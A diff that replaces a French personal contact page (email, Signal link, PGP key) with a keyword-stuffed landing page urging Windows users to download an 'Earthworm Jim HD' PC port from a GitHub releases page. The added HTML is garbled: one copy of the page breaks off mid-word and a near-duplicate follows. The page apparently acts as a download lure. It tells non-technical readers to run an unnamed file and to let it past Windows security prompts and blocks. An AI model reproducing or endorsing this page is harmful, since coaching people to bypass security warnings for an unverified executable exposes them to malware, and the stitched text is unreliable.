@@ -1,190 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>earthworm-jim-hd-recompiled - Relive Earthworm Jim on Windows</title>
+<meta name="description" content="Download earthworm-jim-hd-recompiled, a native PC port of Earthworm Jim HD from Xbox Live Arcade built with static recompilation and the TRG launcher. Simple Windows download and launch guidance for everyday players.">
+<meta name="keywords" content="Earthworm Jim HD, earthworm-jim-hd-recompiled, PC port, static recompilation, TRG launcher, Xbox Live Arcade, Windows game, download, native PC port">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/RStrader25/earthworm-jim-hd-recompiled">
+<meta property="og:type" content="website">
+<meta property="og:title" content="earthworm-jim-hd-recompiled - Relive Earthworm Jim on Windows">
+<meta property="og:description" content="A native PC port of Earthworm Jim HD from Xbox Live Arcade using static recompilation, with the TRG launcher. Download for Windows and start playing.">
+<meta property="og:url" content="https://github.com/RStrader25/earthworm-jim-hd-recompiled/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="earthworm-jim-hd-recompiled - Relive Earthworm Jim on Windows">
+<meta name="twitter:description" content="Download the native PC port of Earthworm Jim HD with the TRG launcher. Easy Windows download page for everyday users.">
+<style>
+  :root {
+    color-scheme: light;
+    --ink: #172033;
+    --muted: #49566e;
+    --line: #dbe3f0;
+    --panel: #ffffff;
+    --soft: #f3f6fb;
+    --accent: #4338ca;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: linear-gradient(180deg, #eef3fb 0%, #f8fafc 45%, #eef3fb 100%);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  .page {
+    width: min(1040px, calc(100% - 32px));
+    margin: 0 auto;
+    padding: 40px 0 64px;
+  }
+  .hero {
+    background: rgba(255, 255, 255, 0.9);
+    border: 1px solid var(--line);
+    border-radius: 24px;
+    padding: clamp(24px, 4vw, 48px);
+    box-shadow: 0 18px 45px rgba(23, 32, 51, 0.09);
+    backdrop-filter: blur(8px);
+  }
+  h1 {
+    margin: 0 0 16px;
+    font-size: clamp(2rem, 4.4vw, 3.35rem);
+    line-height: 1.12;
+    letter-spacing: -0.035em;
+    color: #111827;
+  }
+  h2 {
+    margin: 0 0 14px;
+    font-size: clamp(1.45rem, 2.5vw, 2rem);
+    line-height: 1.2;
+    letter-spacing: -0.02em;
+    color: #172033;
+  }
+  p { margin: 0 0 16px; color: var(--muted); }
+  ul { margin: 0 0 18px; padding-left: 1.25rem; color: var(--muted); }
+  li { margin: 8px 0; }
+  .section {
+    margin-top: 26px;
+    background: var(--panel);
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    padding: clamp(22px, 3.4vw, 38px);
+    box-shadow: 0 10px 28px rgba(23, 32, 51, 0.06);
+  }
+  .button {
+    display: inline-block;
+    width: 100%;
+    max-width: 520px;
+    text-align: center;
+    text-decoration: none;
+    color: #ffffff;
+    font-weight: 800;
+    font-size: clamp(1rem, 2vw, 1.18rem);
+    letter-spacing: 0.01em;
+    padding: 18px 26px;
+    border-radius: 16px;
+    box-shadow: 0 14px 30px rgba(67, 56, 202, 0.28);
+    border: 1px solid rgba(255, 255, 255, 0.35);
+    transition: transform 160ms ease, box-shadow 160ms ease, filter 160ms ease;
+  }
+  .button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 18px 38px rgba(67, 56, 202, 0.35);
+    filter: brightness(1.04);
+  }
+  .button:focus-visible {
+    outline: 4px solid #fbbf24;
+    outline-offset: 3px;
+  }
+  .download-note {
+    margin-top: 14px;
+    font-size: 0.98rem;
+    color: #334155;
+    font-weight: 600;
+  }
+  .small-note { font-size: 0.96rem; color: #52617a; }
+  .steps {
+    list-style: none;
+    padding-left: 0;
+    counter-reset: step;
+  }
+  .steps li {
+    position: relative;
+    padding-left: 48px;
+    margin: 16px 0;
+    min-height: 34px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: #eef2ff;
+    color: var(--accent);
+    border: 1px solid #c7d2fe;
+    display: grid;
+    place-items: center;
+    font-weight: 800;
+  }
+  .callout {
+    background: #f8fafc;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 18px 20px;
+    margin: 18px 0 0;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 14px;
+    margin-top: 18px;
+  }
+  .card {
+    background: var(--soft);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 18px;
+  }
+  .card strong { color: #172033; display: block; margin-bottom: 6px; }
+  .card p { margin: 0; font-size: 0.97rem; }
+  footer { margin-top: 28px; color: #64748b; font-size: 0.94rem; text-align: center; }
+  @media (max-width: 640px) {
+    .page { width: min(100% - 20px, 1040px); padding-top: 18px; }
+    .hero, .section { border-radius: 16px; }
+    .button { max-width: 100%; }
+    body { font-size: 16px; }
+  }
+</style>
+</head>
+<body>
+<main class="page">
+  <section class="hero">
+    <h1 style="color:#111827;">🎮 earthworm-jim-hd-recompiled - Relive Earthworm Jim on Windows</h1>
+    <p style="font-size:1.12rem;color:#334155;">A native PC port of Earth<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>earthworm-jim-hd-recompiled - Relive Earthworm Jim on Windows</title>
+<meta name="description" content="Download earthworm-jim-hd-recompiled, a native PC port of Earthworm Jim HD from Xbox Live Arcade built with static recompilation and the TRG launcher. Simple Windows download and launch guidance for everyday players.">
+<meta name="keywords" content="Earthworm Jim HD, earthworm-jim-hd-recompiled, PC port, static recompilation, TRG launcher, Xbox Live Arcade, Windows game download, native PC port">
+<meta name="author" content="earthworm-jim-hd-recompiled">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/RStrader25/earthworm-jim-hd-recompiled">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="earthworm-jim-hd-recompiled">
+<meta property="og:title" content="earthworm-jim-hd-recompiled - Relive Earthworm Jim on Windows">
+<meta property="og:description" content="A native PC port of Earthworm Jim HD from Xbox Live Arcade using static recompilation, with the TRG launcher. Visit the releases page to download the application for Windows.">
+<meta property="og:url" content="https://github.com/RStrader25/earthworm-jim-hd-recompiled/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="earthworm-jim-hd-recompiled - Relive Earthworm Jim on Windows">
+<meta name="twitter:description" content="Download the native PC port of Earthworm Jim HD with the TRG launcher. A clear Windows download page for everyday users.">
+<style>
+  :root {
+    color-scheme: light;
+    --ink: #172033;
+    --muted: #4a5771;
+    --line: #dbe3f0;
+    --panel: #ffffff;
+    --soft: #f3f6fb;
+    --accent: #4338ca;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: linear-gradient(180deg, #eef3fb 0%, #f8fafc 42%, #eef3fb 100%);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.72;
+    font-size: 17px;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    width: min(1040px, calc(100% - 32px));
+    margin: 0 auto;
+    padding: 40px 0 64px;
+  }
+  .hero {
+    background: rgba(255, 255, 255, 0.92);
+    border: 1px solid var(--line);
+    border-radius: 24px;
+    padding: clamp(24px, 4vw, 48px);
+    box-shadow: 0 18px 45px rgba(23, 32, 51, 0.09);
+  }
+  h1 {
+    margin: 0 0 16px;
+    font-size: clamp(1.85rem, 4.4vw, 3.1rem);
+    line-height: 1.14;
+    letter-spacing: -0.035em;
+    color: #111827;
+  }
+  h2 {
+    margin: 0 0 14px;
+    font-size: clamp(1.4rem, 2.5vw, 1.95rem);
+    line-height: 1.22;
+    letter-spacing: -0.02em;
+    color: #172033;
+  }
+  h3 {
+    margin: 22px 0 8px;
+    font-size: 1.12rem;
+    color: #1e293b;
+  }
+  p { margin: 0 0 16px; color: var(--muted); }
+  ul { margin: 0 0 18px; padding-left: 1.25rem; color: var(--muted); }
+  li { margin: 8px 0; }
+  a { color: #3730a3; }
+  .section {
+    margin-top: 26px;
+    background: var(--panel);
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    padding: clamp(22px, 3.4vw, 38px);
+    box-shadow: 0 10px 28px rgba(23, 32, 51, 0.06);
+  }
+  .badge-button {
+    display: inline-block;
+    width: 100%;
+    max-width: 560px;
+    text-align: center;
+    text-decoration: none;
+    color: #ffffff;
+    font-weight: 800;
+    font-size: clamp(1rem, 2vw, 1.16rem);
+    letter-spacing: 0.01em;
+    padding: 18px 26px;
+    border-radius: 16px;
+    background-image: linear-gradient(120deg, #06b6d4 0%, #6366f1 45%, #d946ef 100%);
+    box-shadow: 0 14px 32px rgba(99, 102, 241, 0.32);
+    border: 1px solid rgba(255, 255, 255, 0.4);
+    transition: transform 160ms ease, box-shadow 160ms ease, filter 160ms ease;
+  }
+  .badge-button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 20px 40px rgba(99, 102, 241, 0.38);
+    filter: brightness(1.05);
+  }
+  .badge-button:focus-visible {
+    outline: 4px solid #fbbf24;
+    outline-offset: 3px;
+  }
+  .download-note {
+    margin-top: 14px;
+    font-size: 0.98rem;
+    color: #334155;
+    font-weight: 600;
+  }
+  .steps {
+    list-style: none;
+    padding-left: 0;
+    counter-reset: step;
+  }
+  .steps li {
+    position: relative;
+    padding-left: 50px;
+    margin: 18px 0;
+    min-height: 34px;
+    color: var(--muted);
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: #eef2ff;
+    color: var(--accent);
+    border: 1px solid #c7d2fe;
+    display: grid;
+    place-items: center;
+    font-weight: 800;
+    font-size: 0.95rem;
+  }
+  .callout {
+    background: #f8fafc;
+    border: 1px solid var(--line);
+    border-left: 5px solid #6366f1;
+    border-radius: 14px;
+    padding: 18px 20px;
+    margin: 20px 0 0;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 14px;
+    margin-top: 18px;
+  }
+  .card {
+    background: var(--soft);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 18px;
+  }
+  .card strong { color: #172033; display: block; margin-bottom: 6px; }
+  .card p { margin: 0; font-size: 0.97rem; }
+  .center { text-align: center; }
+  footer {
+    margin-top: 30px;
+    color: #64748b;
+    font-size: 0.93rem;
+    text-align: center;
+    line-height: 1.6;
+  }
+  @media (max-width: 640px) {
+    .page { width: min(100% - 20px, 1040px); padding-top: 18px; }
+    .hero, .section { border-radius: 16px; }
+    .badge-button { max-width: 100%; }
+    body { font-size: 16px; }
+    .steps li { padding-left: 44px; }
+  }
+</style>
+</head>
+<body>
+<main class="page">
 
-<!doctype html>
-<html lang="fr">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Mathias Vessiere</title>
-    <meta name="description" content="Page personnelle de Mathias Vessiere. Contact : mathias.vess@proton.me" />
-    <!-- SEO : balises Open Graph pour le partage Google/réseaux -->
-    <meta property="og:title" content="Mathias Vessiere" />
-    <meta property="og:description" content="Page personnelle de Mathias Vessiere." />
-    <meta property="og:type" content="profile" />
-    <meta name="theme-color" content="#0d1021" />
-    <!-- Données structurées : aident Google à associer la page à votre identité -->
-    <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "Person",
-        "name": "Mathias Vessiere",
-        "email": "mailto:mathias.vess@proton.me",
-        "url": "https://mathiasvessiere.com/",
-        "sameAs": ["https://signal.me/#eu/j6_s6SmW1mQHwvHQ5QKxsVOC2VEyY0xLxFXSJmevYYoKfBIQ3JZLSYCT_RrFEjdT"]
-      }
-    </script>
-    <style>
-      :root {
-        font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
-        color: #e8eaf2;
-        background: #0d1021;
-      }
-      * { margin: 0; padding: 0; box-sizing: border-box; }
-      body {
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 24px;
-        background:
-          radial-gradient(ellipse 90% 65% at 50% 0%, rgba(92, 107, 192, 0.35), rgba(92, 107, 192, 0.10) 45%, transparent 75%),
-          linear-gradient(180deg, #171b36 0%, #0d1021 60%, #090b19 100%);
-        background-attachment: fixed;
-      }
-      .card {
-        background: #1b2040;
-        max-width: 560px;
-        width: 100%;
-        border-radius: 20px;
-        border: 1px solid rgba(255, 255, 255, 0.07);
-        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.45);
-        padding: 48px 40px;
-        text-align: center;
-      }
-      .avatar {
-        width: 120px;
-        height: 120px;
-        border-radius: 50%;
-        margin: 0 auto 24px;
-        background: #232a4d;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 42px;
-        font-weight: 700;
-        color: #9aa7e8;
-        overflow: hidden;
-        border: 3px solid rgba(232, 234, 242, 0.18);
-        transition: box-shadow 0.25s ease, transform 0.25s ease;
-      }
-      .avatar:hover {
-        transform: scale(1.04);
-        box-shadow: 0 0 0 6px rgba(232, 234, 242, 0.08), 0 10px 30px rgba(0, 0, 0, 0.5);
-      }
-      .avatar img { width: 100%; height: 100%; object-fit: cover; }
-      h1 { font-size: 2rem; letter-spacing: 0.5px; color: #f4f5fb; }
-      .rule {
-        width: 56px;
-        height: 3px;
-        border-radius: 2px;
-        background: linear-gradient(90deg, #8a94b8, #c5cdf5);
-        margin: 18px auto 0;
-      }
-      .sys { margin-top: 14px; font-size: 0.95rem; color: #aab1c9; line-height: 1.6; }
-      .contact-buttons { margin-top: 32px; display: flex; flex-direction: column; gap: 12px; align-items: center; }
-      .contact {
-        display: inline-flex;
-        align-items: center;
-        gap: 10px;
-        padding: 13px 30px;
-        border-radius: 999px;
-        font-weight: 600;
-        font-size: 1rem;
-        text-decoration: none;
-        width: fit-content;
-        transition: transform 0.2s ease, box-shadow 0.2s ease, filter 0.2s ease;
-      }
-      .contact:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(154, 167, 232, 0.35);
-        filter: brightness(1.15);
-      }
-      .contact:active { transform: translateY(0); box-shadow: none; }
-      .contact.mail {
-        color: #e8eaf2;
-        background: #2c3560;
-        border: 1px solid rgba(255, 255, 255, 0.12);
-      }
-      .contact.signal {
-        color: #fff;
-        background: #3a76f0;
-      }
-      .pgp { margin-top: 28px; text-align: left; }
-      .pgp summary { cursor: pointer; font-weight: 600; color: #9aa7e8; font-size: 0.95rem; }
-      .pgp summary:hover { color: #c5cdf5; }
-      .pgp-hint { margin: 12px 0 10px; font-size: 0.85rem; color: #8a92b0; line-height: 1.5; }
-      .pgp-hint code { color: #9aa7e8; }
-      .pgp-key {
-        background: #101329;
-        border: 1px solid rgba(255, 255, 255, 0.08);
-        border-radius: 10px;
-        padding: 14px;
-        font-size: 0.72rem;
-        color: #aab1c9;
-        overflow-x: auto;
-        white-space: pre;
-        max-height: 220px;
-      }
-      footer {
-        margin-top: 36px;
-        font-size: 0.8rem;
-        color: #5d6484;
-      }
-    </style>
-  </head>
-  <body>
-    <main class="card">
-      <!-- Avatar : déposez votre photo sous le nom "avatar.png" à côté d'index.html -->
-      <div class="avatar" aria-label="Photo de Mathias Vessiere"><img src="avatar.png" alt="Mathias Vessiere" /></div>
+  <header class="hero">
+    <h1>🎮 earthworm-jim-hd-recompiled - Relive Earthworm Jim on Windows</h1>
+    <p style="font-size:1.1rem;color:#334155;">A native PC port of Earthworm Jim HD from Xbox Live Arcade, rebuilt through static recompilation and paired with the TRG launcher. No emulator babysitting, no complicated setup wizard full of jargon — just download, launch, and play the classic on your Windows computer.</p>
+    <p><a class="badge-button" href="https://github.com/RStrader25/earthworm-jim-hd-recompiled/releases" target="_blank" rel="noopener">⬇️ Get Earthworm Jim HD for Windows</a></p>
+    <p class="download-note">Visit this link to download the application.</p>
+  </header>
 
-      <!-- SEO : votre nom exact en H1, c'est le signal principal pour Google -->
-      <h1>Mathias Vessiere</h1>
-      <div class="rule" aria-hidden="true"></div>
-      <!-- Bio : ajoutez ici 2-3 phrases sur vous si vous le souhaitez plus tard -->
-
-      <!-- Bloc contact : e-mail (mailto:) et Signal -->
-      <div class="contact-buttons">
-        <a class="contact mail" href="mailto:mathias.vess@proton.me">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m2 7 10 6 10-6"/></svg>
-          mathias.vess@proton.me
-        </a>
-        <a class="contact signal" href="https://signal.me/#eu/j6_s6SmW1mQHwvHQ5QKxsVOC2VEyY0xLxFXSJmevYYoKfBIQ3JZLSYCT_RrFEjdT">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="2"/><path d="M12 2a7 7 0 0 0-4 12.7V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.3A7 7 0 0 0 12 2z"/><path d="M5 21h14"/></svg>
-          Me contacter sur Signal
-        </a>
-        <a class="contact mail" href="contact.vcf" download>
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M19 8v6"/><path d="M22 11h-6"/></svg>
-          Ajouter à mes contacts
-        </a>
+  <section class="section">
+    <h2>🚀 Getting Started</h2>
+    <p>You do not need to know how to program, compile anything, or understand what a recompiler is. If you can download a file and double-click it, you can handle every step below. This page walks you through the whole journey in plain language, from opening the download page to seeing Jim swing his head-whip on your own screen.</p>
+    <p>The entire process usually takes a few minutes. Read the steps once before you begin so you know what to expect, then follow them in order. Nothing here will ask you to open a command window, edit a text file, or hunt down obscure settings.</p>
+    <div class="grid">
+      <div class="card">
+        <strong>Built for Windows</strong>
+        <p>Designed to run as a normal desktop application on a modern Windows PC, opened from a regular shortcut like any other game.</p>
       </div>
+      <div class="card">
+        <strong>Powered by the TRG launcher</strong>
+        <p>The launcher handles the startup routine behind the scenes so you get into the game without touching configuration files.</p>
+      </div>
+      <div class="card">
+        <strong>Native recompilation</strong>
+        <p>The original Xbox Live Arcade code was translated into PC-friendly code, avoiding the usual emulator middle layer.</p>
+      </div>
+    </div>
+  </section>
 
-      <!-- Clé publique PGP exportée depuis Proton -->
-      <details class="pgp">
-        <summary>Clé publique PGP (chiffrement des e-mails)</summary>
-        <p class="pgp-hint">Pour m'écrire de façon chiffrée, chiffrez votre message avec ma clé publique Proton ci-dessous. Empreinte&nbsp;: <code>448B 443B 3B40 C0EB C3D0 C292 37F5 CADA 9594 FFC7</code></p>
-        <pre class="pgp-key">-----BEGIN PGP PUBLIC KEY BLOCK-----
+  <section class="section">
+    <h2>⬇️ Download and Setup</h2>
+    <p>The official source for this project is its releases page on GitHub. That page holds the current build ready for everyday users — you do not need an account, a subscription, or any developer tools to collect it.</p>
+    <p class="center"><a class="badge-button" href="https://github.com/RStrader25/earthworm-jim-hd-recompiled/releases" target="_blank" rel="noopener">Download earthworm-jim-hd-recompiled</a></p>
+    <p class="download-note center">Visit this link to download the application.</p>
+    <ol class="steps">
+      <li><strong>Open the releases page.</strong> Click either of the colourful download buttons on this page, or type the address into your browser. You will land on a list of published versions of the project.</li>
+      <li><strong>Pick the newest release.</strong> The most recent entry sits at the top of the list. Older entries are kept for history, so choose the current one unless you have a specific reason to go back.</li>
+      <li><strong>Find the file attached to that release.</strong> Each release lists its downloadable items underneath the version title. Take the one that clearly belongs to the Windows build of this port.</li>
+      <li><strong>Download it to a folder you can find again.</strong> Your Downloads folder is fine, but a dedicated folder is tidier. Right-click the desktop, choose New, then Folder, and name it something like EarthwormJimHD.</li>
+      <li><strong>Wait for the download to finish.</strong> Your browser shows progress in its download panel. Do not launch anything while the file is still arriving.</li>
+      <li><strong>Check the file you received.</strong> If the file you downloaded is an installer, double-click it and follow the windows that appear. If it is a compressed package, right-click it and choose Extract All, then confirm the destination folder.</li>
+      <li><strong>Look for the launcher.</strong> Inside the folder you extracted or installed, there is an application to start the game. The TRG launcher is the entry point for this project, so look for a name containing TRG, or a shortcut labelled with the game title.</li>
+      <li><strong>Start the game.</strong> Double-click that application. A Windows security prompt may appear the first time you run something new. Choose the option to run it, and the launcher window opens.</li>
+      <li><strong>Play.</strong> Once the launcher finishes its startup routine, the game window appears and you are in control of Jim.</li>
+    </ol>
+    <div class="callout">
+      <p><strong>Keep your folder together.</strong> Whatever you downloaded contains pieces that rely on each other. If you move a single file somewhere else, the game may not start. Move the whole folder if you need to relocate it, and avoid dragging individual files out of it.</p>
+    </div>
+  </section>
 
-xjMEau9wnhYJKwYBBAHaRw8BAQdAjiZ0rQYJD5s27CGcIO5VBxDcOgGONepj
-nCG7hIVMhvHNL21hdGhpYXMudmVzc0Bwcm90b24ubWUgPG1hdGhpYXMudmVz
-c0Bwcm90b24ubWU+wsARBBMWCgCDBYJq73CeAwsJBwkQN/XK2pWU/8dFFAAA
-AAAAHAAgc2FsdEBub3RhdGlvbnMub3BlbnBncGpzLm9yZ3N6nKh/agggLpL5
-mJZaCKACx4Va8V7LZ3rJmUun2zZrAxUKCAQWAAIBAhkBApsDAh4BFiEERItE
-OztAwOvD0MKSN/XK2pWU/8cAAIr2AP9b4RjcXVX4Cf82Vaa2AiqW51wYTh7G
-rLdpjAvYJT2eewD+IyDXJPMCYfgYk3qfmL92O5R381OsCOCsz/coj68aGgnO
-OARq73CeEgorBgEEAZdVAQUBAQdAxYY7tv8Qot7zhwLjuc7KeaulrQb9T4pr
-1P/xDa+S+yEDAQgHwr4EGBYKAHAFgmrvcJ4JEDf1ytqVlP/HRRQAAAAAABwA
-IHNhbHRAbm90YXRpb25zLm9wZW5wZ3Bqcy5vcmeppVkWTClzSDbQHZZ+zRlX
-niT8MvEm8YAyqGW9sO9tYwKbDBYhBESLRDs7QMDrw9DCkjf1ytqVlP/HAABN
-6AEAsNM9iRKdLcq/XxFN4u+FFgwM50wIkGLle0QyHvLF7p8A/ipJx0Ys8fjf
-aeEeYRXDcXxJ7XbmIWFkvaZlxPq1Y3kJ
-=O8lk
------END PGP PUBLIC KEY BLOCK-----</pre>
-      </details>
+  <section class="section">
+    <h2>🖱️ Your First Launch</h2>
+    <p>The first time you open the game, expect a short pause while things settle. Windows may scan the new application, and the launcher may prepare a few files of its own. Give it a moment rather than clicking repeatedly.</p>
+    <p>If a window appears asking whether you trust the application, that is standard Windows behaviour for software it has not seen before. Confirm it to continue. If the launcher opens but the game window does not, close everything, open the launcher again, and let it run without interruption.</p>
+    <h3>Keeping things simple</h3>
+    <ul>
+      <li>Create a desktop shortcut to the launcher so future sessions are a single double-click.</li>
+      <li>Leave the game folder in place after the first successful launch.</li>
+      <li>Close other demanding programs if the game feels sluggish at first.</li>
+      <li>Restart your computer if something behaves oddly right after downloading — it clears up more problems than you would expect.</li>
+    </ul>
+  </section>
 
-      <footer>© <span id="annee">2026</span> Mathias Vessiere</footer>
-      <script>
-        document.getElementById("annee").textContent = new Date().getFullYear();
-      </script>
-    </main>
-  <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" nonce="dAPiVomYp0867CaB27KUog==" data-cf-beacon='{"version":"2024.11.0","token":"36b4216ae2dc4d5488c249161e71fe1e","spa":2}' crossorigin="anonymous"></script>
+  <section class="section">
+    <h2>✨ What Makes This Port Special</h2>
+    <p>Earthworm Jim HD originally appeared on Xbox Live Arcade, which means it lived inside a console storefront rather than on a home computer. This project takes that version and brings it to Windows through static recompilation: the original instructions are translated ahead of time into code your PC understands directly. The result behaves like a native program rather than something running inside an emulator shell.</p>
+    <p>Wrapped around that translated core is the TRG launcher, which gives the project a clean starting point and removes the need to juggle multiple files or command-line options. For you, the practical benefit is straightforward — one thing to open, and a familiar game on the other side.</p>
+    <div class="grid">
+      <div class="card">
+        <strong>Familiar look and feel</strong>
+        <p>The HD presentation from the Xbox Live Arcade release is preserved, including its updated visuals and character art.</p>
+      </div>
+      <div class="card">
+        <strong>Desktop-friendly</strong>
+        <p>Runs in a window or full screen on your PC, launched from a shortcut instead of a console dashboard.</p>
+      </div>
+      <div class="card">
+        <strong>Simple entry point</strong>
+        <p>The TRG launcher is the only thing you need to remember. Everything else lives quietly in its folder.</p>
+      </div>
+      <div class="card">
+        <strong>Open project, open downloads</strong>
+        <p>Releases are published publicly, so you can always return to the same page for the latest build.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <h2>🛠️ Troubleshooting Basics</h2>
+    <p>Most first-time hiccups come down to one of a few simple causes. Work through these in order before assuming something is broken.</p>
+    <ul>
+      <li><strong>Nothing happens when you double-click.</strong> The file may still be inside a compressed package. Right-click it and choose Extract All, then run the application from the new folder.</li>
+      <li><strong>Windows blocks the application.</strong> A protection dialog may appear. Open the file's properties from a right-click and look for an option to allow it, then try again.</li>
+      <li><strong>The launcher opens but the game does not appear.</strong> Close the launcher completely, reopen it, and wait a little longer. First runs can be slower than later ones.</li>
+      <li><strong>You moved files around.</strong> Put the folder back the way it was, or download a fresh copy and start again in a new location.</li>
+      <li><strong>Something still feels wrong.</strong> Delete the folder you downloaded, return to the releases page, and grab the current version once more. A clean start solves most mysteries.</li>
+    </ul>
+  </section>
+
+  <section class="section">
+    <h2>📋 Before You Download</h2>
+    <p>A few quick checks make the whole experience smoother. Make sure you have enough free space for the download plus some breathing room, and keep the folder somewhere your user account can write to — a folder inside your user directory is always a safe choice, while system locations can cause permission trouble.</p>
+    <p>Use a stable internet connection for the download itself. If it stalls, cancel and start over rather than letting a partial file sit on your drive. And when you are ready, come back to the link below — it is the same official page every time.</p>
+    <p class="center"><a class="badge-button" href="https://github.com/RStrader25/earthworm-jim-hd-recompiled/releases" target="_blank" rel="noopener">Go to the Download Page</a></p>
+    <p class="download-note center">Visit this link to download the application.</p>
+  </section>
+
+  <footer>
+    <p>earthworm-jim-hd-recompiled — a native PC port of Earthworm Jim HD via static recompilation, with the TRG launcher.</p>
+  </footer>
+
+</main>
 </body>
 </html>
